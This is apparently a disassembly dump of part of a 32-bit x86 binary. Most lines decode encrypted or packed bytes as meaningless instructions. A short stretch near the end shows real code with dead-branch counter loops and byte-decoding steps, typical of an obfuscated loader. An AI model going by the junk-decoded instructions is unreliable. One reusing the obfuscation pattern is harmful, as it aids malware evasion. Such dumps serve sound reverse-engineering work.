  406968:	jns    0x406941
  40696a:	jo     0x4069ae
  40696c:	fisub  WORD PTR [ebx-0x50a8f50a]
  406972:	push   es
  406973:	ins    DWORD PTR es:[edi],dx
  406974:	popf   
  406975:	and    al,0x76
  406977:	or     esi,0xb756bed9
  40697d:	push   0x30e3b602
  406982:	jp     0x40697f
  406984:	pop    ecx
  406985:	mov    ah,0xc1
  406987:	jnp    0x40692a
  406989:	fcomip st,st(1)
  40698b:	pushf  
  40698c:	es stos BYTE PTR es:[edi],al
  40698e:	sub    BYTE PTR [ebx-0x35cc4cc9],0x9c
  406995:	push   edi
  406996:	fistp  DWORD PTR [eax+0x2e]
  406999:	inc    ecx
  40699a:	dec    ecx
  40699b:	clc    
  40699c:	jmp    0xee626dad
  4069a1:	push   ds
  4069a2:	out    0x86,al
  4069a4:	ret    0xf038
  4069a7:	add    dh,BYTE PTR [ebp+0x3c]
  4069aa:	mov    ebp,DWORD PTR [ebx+0x62]
  4069ad:	cmp    bh,BYTE PTR [esi-0x77]
  4069b0:	mov    esp,0xf6aa1d9c
  4069b5:	dec    ebp
  4069b6:	mov    esi,0xd2b4af15
  4069bb:	push   cs
  4069bc:	addr16 into 
  4069be:	pushf  
  4069bf:	or     eax,0x5092b3b9
  4069c4:	adc    eax,0xe1a5fa4b
  4069c9:	jle    0x406a0c
  4069cb:	imul   esp,edx,0x374bae3e
  4069d1:	add    eax,0xebe3d64e
  4069d6:	sbb    BYTE PTR [ebx],dl
  4069d8:	jecxz  0x40696b
  4069da:	jno    0x406a42
  4069dc:	(bad)  
  4069dd:	in     eax,dx
  4069de:	add    BYTE PTR [eax],al
  4069e0:	daa    
  4069e1:	jne    0x406978
  4069e3:	stc    
  4069e4:	scas   eax,DWORD PTR es:[edi]
  4069e5:	pop    ss
  4069e6:	popa   
  4069e7:	dec    edi
  4069e8:	sbb    ah,BYTE PTR [eax-0x7e]
  4069eb:	xor    al,0x9d
  4069ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ee:	sub    edi,DWORD PTR [eax+0x77]
  4069f1:	xlat   BYTE PTR ds:[ebx]
  4069f2:	jmp    0x2efa:0xe7f25bcb
  4069f9:	add    al,BYTE PTR [eax+0x45]
  4069fc:	dec    edx
  4069fd:	mov    eax,0x66c992f5
  406a02:	ins    BYTE PTR es:[edi],dx
  406a03:	inc    ebp
  406a04:	xchg   ebp,eax
  406a05:	lahf   
  406a06:	sub    al,0x12
  406a08:	or     ebp,DWORD PTR [esi-0x1de4c49c]
  406a0e:	in     al,dx
  406a0f:	mov    es,WORD PTR [esi-0x69c0fcbd]
  406a15:	add    esp,DWORD PTR [ecx+eax*4]
  406a18:	arpl   WORD PTR [ecx-0x3e7bdf2a],ax
  406a1e:	inc    eax
  406a1f:	(bad)  
  406a20:	and    eax,0x8c572e7b
  406a25:	pop    ecx
  406a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a27:	aas    
  406a28:	imul   edi,DWORD PTR [esi+0x5c],0x226afbe7
  406a2f:	data16 rcr BYTE PTR [ebp+0x7d4be651],cl
  406a36:	xchg   BYTE PTR [eax],bl
  406a38:	pop    ds
  406a39:	push   es
  406a3a:	into   
  406a3b:	xchg   esp,eax
  406a3c:	adc    al,0x20
  406a3e:	pop    ebx
  406a3f:	mov    bl,0xdf
  406a41:	loope  0x406a30
  406a43:	pop    ebx
  406a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a45:	mov    edx,0x6ab42aba
  406a4a:	jno    0x406a51
  406a4c:	scas   al,BYTE PTR es:[edi]
  406a4d:	mov    ch,0x4f
  406a4f:	mov    eax,ds:0x6cd50d7b
  406a54:	(bad)  
  406a55:	push   ecx
  406a56:	dec    edi
  406a57:	cmovne edi,edi
  406a5a:	cwde   
  406a5b:	inc    eax
  406a5c:	sbb    BYTE PTR [ebp-0x1d0a2af7],0xa3
  406a63:	xchg   ebx,eax
  406a64:	icebp  
  406a65:	sub    DWORD PTR [eax],esi
  406a67:	and    al,0xa1
  406a69:	shl    DWORD PTR [esi],0xc
  406a6c:	not    BYTE PTR ds:0xa2a9bd0c
  406a72:	icebp  
  406a73:	scas   eax,DWORD PTR es:[edi]
  406a74:	dec    eax
  406a75:	mov    ebp,0x7f24de35
  406a7a:	ins    DWORD PTR es:[edi],dx
  406a7b:	outs   dx,BYTE PTR ds:[esi]
  406a7c:	jmp    0x1b6c9dc0
  406a81:	inc    DWORD PTR [ebp-0x54e90d7b]
  406a87:	mov    ch,0x2
  406a8a:	mov    eax,ds:0x70eaee5d
  406a8f:	dec    ecx
  406a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a91:	in     eax,dx
  406a92:	mov    BYTE PTR [esi-0x72],ch
  406a95:	outs   dx,BYTE PTR es:[esi]
  406a97:	ds jno 0x406aae
  406a9a:	mov    cl,0x39
  406a9c:	sbb    al,0x29
  406a9e:	mov    eax,ds:0x29a63fd1
  406aa3:	ficom  DWORD PTR [eax]
  406aa5:	dec    ebp
  406aa6:	lahf   
  406aa7:	push   cs
  406aa8:	inc    ebx
  406aa9:	scas   al,BYTE PTR es:[edi]
  406aaa:	mov    ds:0xf66dc219,al
  406aaf:	or     ch,BYTE PTR [edi]
  406ab1:	inc    edi
  406ab2:	and    BYTE PTR [eax+ebx*1],cl
  406ab5:	and    bl,BYTE PTR [edx-0x76]
  406ab8:	push   0xd4590d6a
  406abd:	xor    ebx,ebx
  406abf:	sub    esp,DWORD PTR [bp+di]
  406ac2:	push   ebp
  406ac3:	sahf   
  406ac4:	scas   eax,DWORD PTR es:[edi]
  406ac5:	jns    0x406a5f
  406ac7:	ror    BYTE PTR [eax],cl
  406ac9:	sub    DWORD PTR [edx+0x3ac976a9],esi
  406acf:	sbb    esp,0xcd637bbc
  406ad5:	rol    DWORD PTR ds:0x3fefdade,cl
  406adb:	mov    dh,0xf5
  406add:	push   es
  406ade:	jnp    0x406aa6
  406ae0:	jp     0x406a8d
  406ae2:	ret    
  406ae3:	cmp    esp,ebp
  406ae5:	out    0x70,eax
  406ae7:	cmp    eax,0x927b9870
  406aec:	js     0x406add
  406aee:	jae    0x406b35
  406af0:	sub    bh,BYTE PTR [edx+0x38]
  406af3:	sbb    ebx,DWORD PTR [esi-0x3a549d25]
  406af9:	data16 stc 
  406afb:	leave  
  406afc:	adc    ch,BYTE PTR [esi+ebp*8+0x440ff0bb]
  406b03:	scas   eax,DWORD PTR es:[edi]
  406b04:	inc    ebp
  406b05:	add    al,0x3c
  406b07:	js     0x406b41
  406b09:	push   0xffffffad
  406b0b:	cmp    DWORD PTR [edi-0x2cef7a86],ebx
  406b11:	out    dx,al
  406b12:	je     0x406b4f
  406b14:	popf   
  406b15:	arpl   WORD PTR [esi-0x57565cc7],di
  406b1b:	adc    al,0x48
  406b1d:	xchg   esp,eax
  406b1e:	fs out dx,eax
  406b20:	xchg   BYTE PTR [ebx+0x50b13b0e],dl
  406b26:	popf   
  406b27:	nop
  406b28:	sub    DWORD PTR [ebx+0x66],ebp
  406b2b:	push   cs
  406b2c:	push   edi
  406b2d:	fwait
  406b2e:	pop    es
  406b2f:	and    edi,DWORD PTR [ecx]
  406b31:	sbb    bl,BYTE PTR [edx+0x5cc900ea]
  406b37:	scas   eax,DWORD PTR es:[edi]
  406b38:	cmc    
  406b39:	push   0x2921aec1
  406b3e:	push   ds
  406b3f:	sbb    eax,0x561a0644
  406b44:	add    DWORD PTR [esi+0x417e0f72],0xffffffb9
  406b4b:	or     DWORD PTR ds:0xb28def8e,esi
  406b51:	pushf  
  406b52:	pop    ds
  406b53:	xchg   ecx,edx
  406b55:	out    0xbc,eax
  406b57:	hlt    
  406b58:	bound  esi,QWORD PTR [ecx]
  406b5a:	cmp    dh,cl
  406b5c:	xor    BYTE PTR [edx],ch
  406b5e:	inc    edi
  406b5f:	mov    al,0xc7
  406b61:	in     al,dx
  406b62:	fisttp DWORD PTR [edx+0x10606518]
  406b68:	scas   al,BYTE PTR es:[edi]
  406b69:	pop    es
  406b6a:	stos   DWORD PTR es:[edi],eax
  406b6b:	xchg   edx,eax
  406b6c:	jnp    0x406b41
  406b6e:	test   edi,0x1b90d039
  406b74:	xchg   ebx,eax
  406b75:	xchg   ebp,eax
  406b76:	fcom   DWORD PTR [edx-0x76]
  406b79:	outs   dx,BYTE PTR ds:[esi]
  406b7a:	push   ds
  406b7b:	inc    edi
  406b7c:	ins    BYTE PTR es:[edi],dx
  406b7d:	mov    al,ds:0x30734769
  406b82:	pushf  
  406b83:	adc    eax,0xdfb4e206
  406b88:	push   0x404bcc3c
  406b8d:	sbb    eax,0xa18dae6
  406b92:	xchg   esi,eax
  406b93:	or     bh,BYTE PTR [ebx+0x7a01251e]
  406b99:	jae    0x406bb1
  406b9b:	ins    BYTE PTR es:[edi],dx
  406b9c:	xchg   edx,eax
  406b9d:	lods   al,BYTE PTR ds:[esi]
  406b9e:	push   ebp
  406b9f:	outs   dx,BYTE PTR ds:[esi]
  406ba0:	xor    BYTE PTR [eax],dh
  406ba2:	mov    edx,0x32c62c4
  406ba7:	clc    
  406ba8:	pop    edx
  406ba9:	pop    ss
  406baa:	aas    
  406bab:	rol    BYTE PTR [ebp-0x23214726],0x24
  406bb2:	fcomi  st,st(4)
  406bb4:	cmp    BYTE PTR [edi+eiz*1+0x4a],bh
  406bb8:	ja     0x406bc0
  406bba:	(bad)  
  406bbb:	pop    ebx
  406bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bbd:	pop    edi
  406bbe:	adc    DWORD PTR [ebx-0x6b],edx
  406bc1:	adc    edx,DWORD PTR [edi+0x32]
  406bc4:	mov    bl,0xce
  406bc6:	push   ecx
  406bc7:	cli    
  406bc8:	test   DWORD PTR [ecx],0x3a9993a0
  406bce:	loopne 0x406c02
  406bd0:	ins    BYTE PTR es:[edi],dx
  406bd1:	aas    
  406bd2:	jbe    0x406bab
  406bd4:	pop    edi
  406bd5:	xlat   BYTE PTR ds:[ebx]
  406bd6:	(bad)  
  406bd8:	das    
  406bd9:	fsubrp st(3),st
  406bdb:	aad    0xff
  406bdd:	lea    ebx,[ebp+0x78]
  406be0:	retf   
  406be1:	mov    ah,0xa7
  406be3:	fldenv [edi]
  406be5:	mov    ebp,0x538bb7
  406bea:	lea    esi,[eax-0x4]
  406bed:	sub    al,0x13
  406bef:	push   eax
  406bf0:	daa    
  406bf1:	push   ss
  406bf2:	mov    ds,WORD PTR [ecx+0x62bb54b6]
  406bf8:	or     dh,dl
  406bfa:	adc    eax,DWORD PTR [edi+0x6f]
  406bfd:	mov    ch,0xb5
  406bff:	xor    al,0xfd
  406c01:	or     BYTE PTR [esi-0x5e],dh
  406c04:	sbb    dl,BYTE PTR [esi]
  406c06:	add    BYTE PTR [edi],ch
  406c08:	mov    al,bl
  406c0a:	pop    esi
  406c0b:	and    DWORD PTR [ebx+0x412224],0x330c458b
  406c15:	shr    ecx,0x85
  406c18:	add    eax,DWORD PTR [eax]
  406c1a:	add    bl,dh
  406c1c:	into   
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	xchg   DWORD PTR [esp+edi*8],esi
  406c2a:	out    0x38,eax
  406c2c:	retf   0x7e7e
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	test   DWORD PTR [edi],esi
  406c35:	imul   ebx,DWORD PTR [edi],0x1ef89010
  406c3b:	adc    BYTE PTR [esi-0x5e4d9240],dl
  406c41:	and    eax,0xe974a0cc
  406c46:	jle    0x406c4c
  406c48:	sub    al,0xbb
  406c4a:	pop    edx
  406c4b:	pop    es
  406c4c:	and    dl,BYTE PTR [ebx]
  406c4e:	jmp    0x1aa1:0x5427a62
  406c55:	adc    bl,BYTE PTR [ebx-0x2f26052]
  406c5b:	xor    DWORD PTR [edi],ecx
  406c5d:	test   al,0xd4
  406c5f:	jb     0x406c9d
  406c61:	mov    eax,ds:0x4c1362df
  406c66:	sbb    dh,BYTE PTR [eax+ecx*8+0x1a19490b]
  406c6d:	mov    esp,0xf88fdb2a
  406c72:	jno    0x406ca1
  406c74:	or     dh,ah
  406c76:	jg     0x406ca4
  406c78:	fdivr  DWORD PTR [esi-0x41851c0e]
  406c7e:	test   BYTE PTR [edx+0x7933fc72],ch
  406c84:	mov    ds:0x25bfb3ec,al
  406c89:	fwait
  406c8a:	dec    edx
  406c8b:	pop    esi
  406c8c:	mov    ch,0x3f
  406c8e:	push   eax
  406c8f:	ret    
  406c90:	pop    eax
  406c91:	mov    bl,dl
  406c93:	imul   esi,DWORD PTR [eax+0x7],0x66
  406c97:	jne    0x406c88
  406c99:	mov    eax,0xf0bbd2c2
  406c9e:	jno    0x406ca1
  406ca0:	adc    al,0x20
  406ca2:	retf   0xad32
  406ca5:	or     eax,0xe951e159
  406caa:	aas    
  406cab:	int3   
  406cac:	call   0x5c3419dd
  406cb1:	inc    eax
  406cb2:	out    0x9b,eax
  406cb4:	adc    cl,BYTE PTR [ebp-0x51]
  406cb7:	xor    eax,0x531716d
  406cbc:	inc    ebx
  406cbd:	or     eax,edx
  406cbf:	int    0x29
  406cc1:	inc    esi
  406cc2:	mov    ebp,0xf35d4519
  406cc7:	pop    esi
  406cc8:	inc    ebp
  406cc9:	mov    esp,0xeb58cb13
  406cce:	ss stc 
  406cd0:	dec    esp
  406cd1:	pop    edi
  406cd2:	sub    DWORD PTR [ecx-0x65],0xce6ccac3
  406cd9:	pusha  
  406cda:	lods   eax,DWORD PTR ds:[esi]
  406cdb:	fucomp st(4)
  406cdd:	pop    eax
  406cde:	mov    ch,0xc0
  406ce0:	cdq    
  406ce1:	and    al,0x6b
  406ce3:	mov    esp,0xabc3cb0d
  406ce8:	sub    BYTE PTR [eax-0x48],bl
  406ceb:	lahf   
  406cec:	iret   
  406ced:	out    dx,al
  406cee:	sub    edi,DWORD PTR [ecx+ebp*2]
  406cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf2:	loop   0x406cb3
  406cf4:	mov    ah,0x4a
  406cf6:	stos   BYTE PTR es:[edi],al
  406cf7:	stc    
  406cf8:	stc    
  406cf9:	sub    ch,ch
  406cfb:	or     DWORD PTR [edx+0x64],edi
  406cfe:	outs   dx,DWORD PTR ds:[esi]
  406cff:	xchg   BYTE PTR [ebx-0x6e070410],ch
  406d05:	adc    DWORD PTR [edx-0x30],ebx
  406d08:	or     eax,0xa76e2050
  406d0d:	sub    eax,0x7fc6eee0
  406d12:	jo     0x406cb5
  406d14:	fwait
  406d15:	(bad)  
  406d16:	cmp    eax,0x7e20dd1a
  406d1b:	inc    edi
  406d1c:	dec    esp
  406d1d:	enter  0x4da5,0x85
  406d21:	(bad)  
  406d22:	lea    esi,[edx+ebp*2+0x610acffe]
  406d29:	rcr    DWORD PTR [ecx-0x20],cl
  406d2c:	add    dh,dl
  406d2e:	out    0xaa,eax
  406d30:	adc    al,0x51
  406d32:	lds    ebx,FWORD PTR cs:[esi]
  406d35:	pop    ecx
  406d36:	jmp    0xd49e7a38
  406d3b:	pop    ecx
  406d3c:	(bad)  
  406d3d:	std    
  406d3e:	mov    bh,0x35
  406d40:	je     0x406cff
  406d42:	cld    
  406d43:	fidivr WORD PTR [ecx+ebp*1-0x3b34710d]
  406d4a:	pop    ecx
  406d4b:	jb     0x406cf9
  406d4d:	jmp    0x406d25
  406d4f:	mov    edi,0x64e8843c
  406d54:	sbb    al,0x3d
  406d56:	adc    edx,DWORD PTR [edi+0x1b]
  406d59:	sbb    DWORD PTR ds:0x32338296,eax
  406d5f:	jmp    0x181d3efe
  406d64:	pop    ebp
  406d65:	shr    BYTE PTR [edx-0x53],1
  406d68:	pop    edx
  406d69:	sbb    BYTE PTR [ebx],dh
  406d6b:	pop    esp
  406d6c:	pop    esi
  406d6d:	xor    DWORD PTR [edi+0x23],edx
  406d70:	inc    ebx
  406d71:	jg     0x406dd8
  406d73:	out    0x9b,al
  406d75:	add    ebp,DWORD PTR [bp+di+0x48]
  406d79:	jge    0x406dca
  406d7b:	fist   DWORD PTR [ecx]
  406d7d:	lods   eax,DWORD PTR ds:[esi]
  406d7e:	mov    ds:0xf15894a6,al
  406d83:	mov    ds:0x3e0f528e,al
  406d88:	aas    
  406d89:	stos   BYTE PTR es:[edi],al
  406d8a:	and    edx,edx
  406d8c:	jge    0x406ddc
  406d8e:	sbb    BYTE PTR [ebx+0x0],ch
  406d91:	aam    0xcc
  406d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d94:	or     al,0x36
  406d96:	test   al,0x28
  406d98:	fidiv  DWORD PTR [esi]
  406d9a:	pop    edx
  406d9b:	call   0x677f534a
  406da0:	mov    ecx,0x9b6152be
  406da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da6:	push   ebx
  406da7:	jne    0x406d7f
  406da9:	int3   
  406daa:	je     0x406ddd
  406dac:	mov    ebp,0xfccd8e1a
  406db1:	cld    
  406db2:	dec    edi
  406db3:	jmp    0x80bedc51
  406db8:	inc    esi
  406db9:	or     ch,bl
  406dbb:	dec    esp
  406dbc:	in     eax,0x17
  406dbe:	das    
  406dbf:	iret   
  406dc0:	hlt    
  406dc1:	push   cs
  406dc2:	mov    ss,WORD PTR [ebp-0x544d456c]
  406dc8:	inc    esi
  406dc9:	int    0x44
  406dcb:	mov    ecx,0x9883971e
  406dd0:	imul   esp,esp,0x65
  406dd3:	mov    ebx,0x560eabf1
  406dd8:	inc    edx
  406dd9:	jg     0x406d9b
  406ddb:	push   esi
  406ddc:	test   DWORD PTR [ecx-0x59],ebx
  406ddf:	shl    BYTE PTR [ebx-0x3b],1
  406de2:	test   DWORD PTR [esi+edx*8-0x2],ecx
  406de6:	fisttp WORD PTR [edi+0x58]
  406de9:	dec    esi
  406dea:	or     eax,0x6552d05d
  406def:	push   0x45
  406df1:	dec    esp
  406df2:	and    al,0xc3
  406df4:	je     0x406e06
  406df6:	out    0x7d,al
  406df8:	sbb    BYTE PTR [ebx-0x55],ah
  406dfb:	xchg   ebx,eax
  406dfc:	cmp    ch,cl
  406dfe:	and    ebp,DWORD PTR [ecx+edx*4-0x10725b5]
  406e05:	loope  0x406e5d
  406e07:	pop    ss
  406e08:	push   edi
  406e09:	sar    DWORD PTR [ebx+esi*1+0x76],cl
  406e0d:	mov    dl,0x92
  406e0f:	dec    edi
  406e10:	adc    BYTE PTR [edx],cl
  406e12:	fld    DWORD PTR [ebx]
  406e14:	inc    ebx
  406e15:	pop    edx
  406e16:	mov    edi,ebx
  406e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e19:	push   edx
  406e1a:	jbe    0x406db9
  406e1c:	hlt    
  406e1d:	adc    al,0x75
  406e1f:	iret   
  406e20:	jbe    0x406e73
  406e22:	xchg   edi,eax
  406e23:	(bad)  
  406e24:	loop   0x406dd1
  406e26:	lahf   
  406e27:	push   ds
  406e28:	loopne 0x406de0
  406e2a:	mov    dl,0x22
  406e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e2d:	aaa    
  406e2e:	out    0xa5,eax
  406e30:	leave  
  406e31:	aas    
  406e32:	je     0x406ddd
  406e34:	aad    0xd3
  406e36:	jmp    0x78f:0xe19af6be
  406e3d:	xchg   esi,eax
  406e3e:	inc    esi
  406e3f:	jne    0x406e36
  406e41:	popa   
  406e42:	pop    es
  406e43:	mov    eax,ds:0xc1c59584
  406e49:	in     al,0x61
  406e4b:	out    dx,al
  406e4c:	ret    0x6e90
  406e4f:	(bad)  
  406e50:	mov    cl,dl
  406e52:	lahf   
  406e53:	cmc    
  406e54:	rol    DWORD PTR [ecx],0x14
  406e57:	call   0xa72abc66
  406e5c:	add    DWORD PTR [edx-0x40],ecx
  406e5f:	mov    eax,0x6a72924b
  406e64:	addr16 cs mov eax,eax
  406e68:	add    DWORD PTR [edi],edi
  406e6a:	(bad)
  406e6d:	bound  eax,QWORD PTR [edi+0xa612dee]
  406e73:	icebp  
  406e74:	repz sahf 
  406e76:	data16 xlat BYTE PTR ds:[ebx]
  406e78:	aad    0xa
  406e7a:	jo     0x406e5c
  406e7c:	sbb    edi,DWORD PTR [eax-0x1e]
  406e7f:	(bad)  
  406e80:	(bad)  
  406e81:	mov    ecx,0xe157084f
  406e86:	jae    0x406eec
  406e88:	cmp    dh,BYTE PTR ss:[ebx-0x37059c79]
  406e8f:	repz push ebp
  406e91:	ss dec esp
  406e93:	lock push ebx
  406e95:	iret   
  406e96:	not    ecx
  406e98:	sbb    ebp,DWORD PTR [edx+edi*1+0x79]
  406e9c:	sub    eax,DWORD PTR [ebp-0x22]
  406e9f:	inc    esi
  406ea0:	adc    BYTE PTR ds:[eax],ch
  406ea3:	mov    dl,0xb9
  406ea5:	xchg   ecx,eax
  406ea6:	ss inc edi
  406ea8:	mov    al,ds:0xb64b575c
  406ead:	retf   
  406eae:	adc    BYTE PTR [esi-0x352f250a],al
  406eb4:	pop    eax
  406eb5:	mov    dh,bh
  406eb7:	loop   0x406e80
  406eb9:	(bad)  [ecx+0xf]
  406ebc:	and    esi,DWORD PTR [eax-0x20]
  406ebf:	push   ebx
  406ec0:	dec    edi
  406ec1:	lds    esi,FWORD PTR [edx-0x68]
  406ec4:	es jne 0x406e88
  406ec7:	clc    
  406ec8:	cmp    ebp,DWORD PTR [eax+0x2daa9c2d]
  406ece:	enter  0x2bb2,0xa4
  406ed2:	push   edx
  406ed3:	add    BYTE PTR [eax+0x1c32208],0x66
  406eda:	jbe    0x406f35
  406edc:	enter  0x1a2f,0xc8
  406ee0:	adc    esp,DWORD PTR [ecx]
  406ee2:	xchg   esp,eax
  406ee3:	xor    esp,ecx
  406ee5:	out    0xf0,al
  406ee7:	xor    al,0xb6
  406ee9:	and    ch,al
  406eeb:	dec    esi
  406eec:	add    bl,ah
  406eee:	pop    ecx
  406eef:	sub    BYTE PTR [esi+0x5b],ah
  406ef2:	push   ss
  406ef3:	cmp    BYTE PTR ds:0xa647c7a0,dh
  406ef9:	ins    DWORD PTR es:[edi],dx
  406efa:	add    DWORD PTR [ecx],ecx
  406efc:	repnz push ecx
  406efe:	pop    ecx
  406eff:	dec    ecx
  406f00:	mov    cl,0x10
  406f02:	jmp    0xe973:0x3c47a24b
  406f09:	shl    ebx,0xb7
  406f0c:	push   esp
  406f0d:	add    BYTE PTR [ecx-0x39],cl
  406f10:	mov    dl,BYTE PTR [ebx]
  406f12:	clc    
  406f13:	jnp    0x406f10
  406f15:	jmp    0x406f7e
  406f17:	stos   DWORD PTR es:[edi],eax
  406f18:	or     al,0xf0
  406f1a:	ror    DWORD PTR [esi-0x30999b09],cl
  406f20:	pop    ecx
  406f21:	stc    
  406f22:	fist   DWORD PTR [ecx-0x3a25b3b7]
  406f28:	outs   dx,DWORD PTR ds:[esi]
  406f29:	dec    edx
  406f2a:	shl    BYTE PTR [edx+0x25],cl
  406f2d:	(bad)
  406f30:	aad    0x4a
  406f32:	ja     0x406ee2
  406f34:	jp     0x406f0f
  406f36:	ja     0x406f86
  406f38:	pop    ss
  406f39:	cs inc esi
  406f3b:	jb     0x406f34
  406f3d:	jge    0x406f48
  406f3f:	adc    ecx,DWORD PTR [esi]
  406f41:	jns    0x406f58
  406f43:	mov    al,0xb9
  406f45:	jecxz  0x406ef5
  406f47:	jmp    0xac17f12a
  406f4c:	pop    ebp
  406f4d:	not    DWORD PTR [esi+0xf2d96f5]
  406f53:	adc    edi,DWORD PTR [esi+0x74c1fbf5]
  406f59:	in     al,0xa
  406f5b:	add    al,0xbf
  406f5d:	mov    esp,0x6f62e4bb
  406f62:	mov    dl,0x5f
  406f64:	scas   eax,DWORD PTR es:[edi]
  406f65:	jo     0x406f69
  406f67:	test   al,0x68
  406f69:	push   ecx
  406f6a:	iret   
  406f6b:	sbb    dh,BYTE PTR [edx-0x42f22b85]
  406f71:	jp     0x406ef8
  406f73:	and    ebx,DWORD PTR [esi+0x20]
  406f76:	dec    esi
  406f77:	mov    ch,0x16
  406f79:	inc    ecx
  406f7a:	push   0xdf81df2b
  406f7f:	scas   eax,DWORD PTR es:[edi]
  406f80:	jle    0x406fc5
  406f82:	inc    eax
  406f83:	ss cmp eax,0x8114f9e6
  406f89:	cwde   
  406f8a:	dec    edi
  406f8b:	int    0x8e
  406f8d:	sbb    DWORD PTR [eax],esp
  406f8f:	xchg   ebx,eax
  406f90:	pop    ecx
  406f91:	mov    BYTE PTR [ebp+esi*4+0x36],cl
  406f95:	jnp    0x406f85
  406f97:	stos   DWORD PTR es:[edi],eax
  406f98:	(bad)  
  406f99:	call   0xad344393
  406f9e:	or     ecx,ebx
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430596,0x19
  406fd8:	cmp    DWORD PTR ds:0x430596,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430596,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ebc4
  406ffd:	cmp    DWORD PTR ds:0x430596,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430596
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430596,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430596
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430596,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430656,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43064a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef18,0x42ef20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eca4
  4070a9:	cmp    DWORD PTR ds:0x42ef1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43065a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ef28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ef28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ef28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ef28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ef28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ef24
  407123:	call   DWORD PTR ds:0x42eca8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4305ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430592,0x17
  407147:	cmp    DWORD PTR ds:0x430592,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430592,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430592
  407179:	dec    eax
  40717a:	mov    ds:0x430592,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x2d7055de
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407202
